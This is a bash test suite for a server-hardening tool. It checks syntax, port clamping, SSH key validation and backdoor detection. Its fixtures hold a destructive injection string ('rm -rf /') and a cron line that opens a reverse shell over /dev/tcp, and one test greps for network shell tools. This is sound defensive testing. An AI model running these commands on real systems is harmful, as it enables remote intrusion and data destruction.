#!/usr/bin/env bash
# ==============================================================================
#            BASTION SECURITY HARDENING & BACKDOOR DEFENSE TEST SUITE
# ==============================================================================
set -uo pipefail

C_RED='\033[0;31m'
C_GREEN='\033[0;32m'
C_YELLOW='\033[1;33m'
C_BLUE='\033[0;34m'
C_BOLD='\033[1m'
NC='\033[0m'

PASSED=0
FAILED=0

test_case() {
    local name="$1"
    local command="$2"
    echo -n -e "${C_BOLD}Testing: ${name}... ${NC}"
    if eval "$command" >/dev/null 2>&1; then
        echo -e "${C_GREEN}[PASS]${NC}"
        ((PASSED++)) || true
    else
        echo -e "${C_RED}[FAIL]${NC}"
        ((FAILED++)) || true
    fi
}

echo -e "\n${C_BLUE}======================================================${NC}"
echo -e "${C_BLUE}     RUNNING BASTION HARDENING & RESILIENCE TESTS     ${NC}"
echo -e "${C_BLUE}======================================================\n"

# Test 1: Bash syntax validation
test_case "setup.sh bash syntax integrity" "bash -n setup.sh"
test_case "audit.sh bash syntax integrity" "bash -n audit.sh"

# Test 2: Input clamp logic
clamp_uint() {
    local val="$1"
    local min="$2"
    local max="$3"
    local fallback="$4"

    if [[ "$val" =~ ^[0-9]+$ ]] && [ "$val" -ge "$min" ] && [ "$val" -le "$max" ]; then
        echo "$val"
    else
        echo "$fallback"
    fi
}
test_case "clamp_uint within bounds" "[ $(clamp_uint 22 1 65535 22) -eq 22 ]"
test_case "clamp_uint out of bounds fallback" "[ $(clamp_uint 99999 1 65535 22) -eq 22 ]"
test_case "clamp_uint non-numeric fallback" "[ $(clamp_uint abc 1 65535 22) -eq 22 ]"

# Test 3: Public key regex validation
is_valid_pubkey() {
    local key="$1"
    [[ "$key" =~ ^(ssh-ed25519|ssh-rsa|ecdsa-sha2-nistp256|ecdsa-sha2-nistp384|ecdsa-sha2-nistp521|sk-ssh-ed25519@openssh\.com|sk-ecdsa-sha2-nistp256@openssh\.com)\ [A-Za-z0-9+/]+=*(\ .*)?$ ]] || return 1
    if command -v ssh-keygen &>/dev/null; then
        ssh-keygen -l -f <(printf '%s\n' "$key") &>/dev/null || return 1
    fi
    return 0
}
test_case "Valid ED25519 pubkey validation" "is_valid_pubkey 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGD6J1b7X8qM5k2wLp0r8V9z4s3d2f1gHjKlMnOpQrSt test@local'"
test_case "Rejection of malformed / injection key" "! is_valid_pubkey 'ssh-ed25519 AAA; rm -rf /'"

# Test 4: Backdoor detection in audit.sh
TMP_AUDIT_DIR=$(mktemp -d)
trap 'rm -rf "$TMP_AUDIT_DIR"' EXIT

# Create a test backdoor file in fake cron
mkdir -p "$TMP_AUDIT_DIR/cron.d"
echo "* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > "$TMP_AUDIT_DIR/cron.d/malicious"
test_case "Detection of reverse shell syntax" "grep -qiE '(curl|wget|bash -i|/dev/tcp|nc -e)' '$TMP_AUDIT_DIR/cron.d/malicious'"

echo -e "\n${C_BOLD}Test Summary: ${C_GREEN}${PASSED} passed${NC}, ${C_RED}${FAILED} failed${NC}.\n"
